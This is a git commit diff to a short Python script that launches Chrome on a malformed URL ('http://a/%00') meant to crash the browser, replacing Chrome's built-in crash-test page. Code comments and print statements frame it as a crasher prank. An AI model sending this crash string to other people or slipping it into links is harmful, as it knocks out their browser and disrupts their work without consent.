510d470ede574226140b02c70fd6db80a71cd2d5
Ball-Capper <91905052+Ball-Capper@users.noreply.github.com>
2021-10-04 11:18:38 -0700

    Update main.py

--- main.py
+++ main.py
@@ -1,8 +1,16 @@
 import webbrowser
+import time
 #uses the dev crash test thingy
-url = 'chrome://inducebrowsercrashforrealz'
+url = 'http://a/%00'
 #runs chrome
+print('Opening Chrome')
+time.sleep(3)
 chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'
+time.sleep(3)
+print('Done')
 #opens the dev url
+print('Opening Crasher thing')
+time.sleep(3)
 webbrowser.get(chrome_path).open(url) #crashes coom
-#windows
+time.sleep(3)
+print('Done')
